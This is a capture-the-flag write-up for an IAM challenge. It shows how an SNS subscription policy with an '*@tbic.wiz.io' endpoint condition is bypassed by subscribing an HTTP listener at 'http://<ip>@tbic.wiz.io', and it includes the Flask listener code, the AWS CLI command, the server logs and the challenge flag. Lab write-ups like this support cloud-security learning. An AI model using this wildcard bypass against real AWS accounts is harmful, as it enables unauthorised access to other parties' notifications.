---
tags:
  - IAM
  - SNS
title: The BIG IAM Challenge - Enable Push Notifications
description: Asterisks are risky
reference: https://thebigiamchallenge.com/challenge/3
---


## Challenge

We got a message for you. Can you get it?

## Solution

### 1. View the provided IAM Policy

Only `*@tbic.wiz.io` endpoint can subscribe `arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications` SNS.

```json
{ "Version": "2008-10-17", "Id": "Statement1", "Statement": [ { "Sid": "Statement1", "Effect": "Allow", "Principal": { "AWS": "*" }, "Action": "SNS:Subscribe", "Resource": "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications", "Condition": { "StringLike": { "sns:Endpoint": "*@tbic.wiz.io" } } } ] }
```


### 2. Run a self hosted simple web server for subscribing topic from SNS

python code:

```python
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route("/", methods=["POST"])
def sns_listener():
    data = request.json
    print("Received SNS message:", data)
    return jsonify({"status": "received"}), 200

@app.route("/@tbic.wiz.io", methods=["POST"])
def sns_listener2():
    data = request.data
    print("Received SNS message:", data)
    return jsonify({"status": "received"}), 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
```

Running in google cloud VM:

```bash
instance-20250525-081719:~$ sudo python3 server.py 
 * Serving Flask app 'server'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:80
 * Running on http://10.170.0.2:80
```

### 3. Try to subscribe the SNS

Subscribe Command:

```
> aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol http --notification-endpoint

http://<your_server_public_ip>@tbic.wiz.io --return-subscription-arn

{

    "SubscriptionArn": "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications:0776d753-8afa-47e0-92fe-b5f3e44c88ce"

}
```

Server output - subscription confirmation:

> To confirm the subscription, visit the SubscribeURL included in this message

```
Received SNS message: b'{\n  "Type" : "SubscriptionConfirmation",\n  "MessageId" : "180dce02-87fa-45ea-bce5-d2df709d0eee",\n  "Token" : "2336412f37fb687f5d51e6e2425a8a5875c3b795633859d52dc0461b16af1c0faa46a09d4f83636e661c1c4b4e6480eb541fed92ed0f1e91d76b9e149e1cc71ba41c071fe7cfb617704beecf728de5d3fecee41da0096199f7546732b0b027ce0350265417f07a94f1b9e0fd68170a214ca39684c51574aecac3664b29920966",\n  "TopicArn" : "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",\n  "Message" : "You have chosen to subscribe to the topic arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications.\\nTo confirm the subscription, visit the SubscribeURL included in this message.",\n  "SubscribeURL" : "https://sns.us-east-1.amazonaws.com/?Action=ConfirmSubscription&TopicArn=arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications&Token=2336412f37fb687f5d51e6e2425a8a5875c3b795633859d52dc0461b16af1c0faa46a09d4f83636e661c1c4b4e6480eb541fed92ed0f1e91d76b9e149e1cc71ba41c071fe7cfb617704beecf728de5d3fecee41da0096199f7546732b0b027ce0350265417f07a94f1b9e0fd68170a214ca39684c51574aecac3664b29920966",\n  "Timestamp" : "2025-05-25T08:30:23.770Z",\n  "SignatureVersion" : "1",\n  "Signature" : "VS8hirF8HSOKzYF+33J6M+5yGefnd/KJAWwwMfRG2q8aDwHFTVinFcc8kQxHIMhW/dl49mG7cBjXKrDZASx8K+Bwm2gmOXRDymDQ36DFWE9itCVISW08PSOpjfzQPdMIrT9bg6ISUJiUhM3m0pQoL4K6ObJDA50CexTER93SWWelWIeQz4DwMenpF0AtBSTJvGFpvu+ZQI95rg4uHIhsiTervv9Ay+G7f08ZRZAyxNo8WLXDPLL2Cbc/nV0bgn6vMYQtD6hmf1Ow4x6UhWLFm55kCYD1PFMdKj78l+v4VNqCBPLtycGOe71iTgmfl6I3UsL/CkGdoioBrTruF9I8Jg==",\n  "SigningCertURL" : "https://sns.us-east-1.amazonaws.com/SimpleNotificationService-9c6465fa7f48f5cacd23014631ec1136.pem"\n}'
15.221.161.70 - - [25/May/2025 08:30:56] "POST /@tbic.wiz.io HTTP/1.1" 200 -
```

Got SNS messages after visiting `https://sns.us-east-1.amazonaws.com/?Action=ConfirmSubscription&TopicArn=arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications&Token=2336412f37fb687f5d51e6e2425a8a5875c3b795633859d52dc0461a8da339da7e8d7bb129b1156cf705c5e53fed4e51845a93ce26b93557034d4cf0882bcc90890686609957e6cc311f7870f09883bfa28c0216dd9106e8ef809adb98c9ea307e3be977cf6644d3e98482622d2cd72ea55f20372307700cedfcb7b3d6b55746`:

```
Received SNS message: b'{\n  "Type" : "Notification",\n  "MessageId" : "4f2a362e-5899-5518-b4fe-5682809d9af0",\n  "TopicArn" : "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",\n  "Message" : "{wiz:always-suspect-asterisks}",\n  "Timestamp" : "2025-05-25T08:33:08.480Z",\n  "SignatureVersion" : "1",\n  "Signature" : "dBbJgx4PeAsKrMNZ6QQr7g2HlXv0FkSzHTmvFk0TOrngDjpJYyve7U5XRdc+OC1dsZ3FjQpV1QWBya09Y9kdZ+fhXibXQO5YF2XJJSRs2wO6GPLyYDRwmpQneNAT8XzU696/ByFJC2IcYpu2jNW6pAInkxLAe52ityD35BYPArwhObIhbEW6zz0EvkupCZ2q9tNgdBRsDbGXqtAWnu6Z9jiAwjCIoaIrz0p5S9SJRd9HJ22IQAfIMNSprmc+SdkqBRQtJD3Lzwkgc+5hFH9zpzcALn8sl6aYuL4KMgK+jbxV/yPmAnvyl14sL5Wr2H16wn/SxRo50oFQyEAN08/zNw==",\n  "SigningCertURL" : "https://sns.us-east-1.amazonaws.com/SimpleNotificationService-9c6465fa7f48f5cacd23014631ec1136.pem",\n  "UnsubscribeURL" : "https://sns.us-east-1.amazonaws.com/?Action=Unsubscribe&SubscriptionArn=arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications:4c27a003-f37c-4667-a315-95e2c2f6667f"\n}'
15.221.161.167 - - [25/May/2025 08:33:08] "POST /@tbic.wiz.io HTTP/1.1" 200 -
Received SNS message: b'{\n  "Type" : "Notification",\n  "MessageId" : "5f627f4c-8c92-5df3-ad99-1fe054d26a7a",\n  "TopicArn" : "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",\n  "Message" : "{wiz:always-suspect-asterisks}",\n  "Timestamp" : "2025-05-25T08:34:08.375Z",\n  "SignatureVersion" : "1",\n  "Signature" : "ck4JDdRb8MnUQ9KoLcRw6Bpj98dwiaD88nD9qN5uBJD8FO/vCE7eLbBRh+CwsuCUw35gpn3owDJNZ39aeRrAvrLa3BkJ00TbNU/Y71X0TvHlMbiM4Z4T0MVQ069JghjLLOhZZe3b6KLnCEJCwcZLrkkNmqdT4G5eM1SShUs95aonol9ZsxTX/A/YVC/nz+HatmflQRkr+07LV+ErsI5Hf/dy+emVDtdKA9Wqj9wb58m5xZRkaDrwe/K5DI5mdAU4j6kHl1Pyw+pIynx1bhtTG7vEa0TZhvfyvijohs+1YNgAkuPN69NKKZ18UUzX/1yT4v6II5A7s+vJ6xh3/r/bVA==",\n  "SigningCertURL" : "https://sns.us-east-1.amazonaws.com/SimpleNotificationService-9c6465fa7f48f5cacd23014631ec1136.pem",\n  "UnsubscribeURL" : "https://sns.us-east-1.amazonaws.com/?Action=Unsubscribe&SubscriptionArn=arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications:4c27a003-f37c-4667-a315-95e2c2f6667f"\n}'
15.221.161.53 - - [25/May/2025 08:34:08] "POST /@tbic.wiz.io HTTP/1.1" 200 -
Test
141.98.11.27 - - [25/May/2025 08:34:42] "GET / HTTP/1.1" 200 -
Received SNS message: b'{\n  "Type" : "Notification",\n  "MessageId" : "e3f26244-eaeb-5668-85a0-02e832977e61",\n  "TopicArn" : "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",\n  "Message" : "{wiz:always-suspect-asterisks}",\n  "Timestamp" : "2025-05-25T08:35:08.715Z",\n  "SignatureVersion" : "1",\n  "Signature" : "g0kWQHiFGHUr91kdaS8/Rjjj8QJAU75qFMxBW444yHHUljJJLPvq+NR4RDSqYjYu5XyEHL2cc3IP6YrTk9eUYzyLPRazZcigpPrU9r12faxW+2w1F3BpIbYf9sYMzrWzAc7Ed666xolZ4rn4I9AjXH+I1OA8CxcCEMZQaiDjMGbMaa1XNIGsXyAs6wx2ijVFi7KhHM8sex54TwYAW1G8uXhgfWYmOfsdnpaubtTi7ztyIJi5zfXrkEQ4WTBEnlgiYL7xEhsAugxlFqmEASMRZSnMzldUdYdVjmur1JxpSuH9pivbv4PmoHHovCvPamXQx//X4O2NUOfoDjG9sySAew==",\n  "SigningCertURL" : "https://sns.us-east-1.amazonaws.com/SimpleNotificationService-9c6465fa7f48f5cacd23014631ec1136.pem",\n  "UnsubscribeURL" : "https://sns.us-east-1.amazonaws.com/?Action=Unsubscribe&SubscriptionArn=arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications:4c27a003-f37c-4667-a315-95e2c2f6667f"\n}'
15.221.161.145 - - [25/May/2025 08:35:09] "POST /@tbic.wiz.io HTTP/1.1" 200 -
```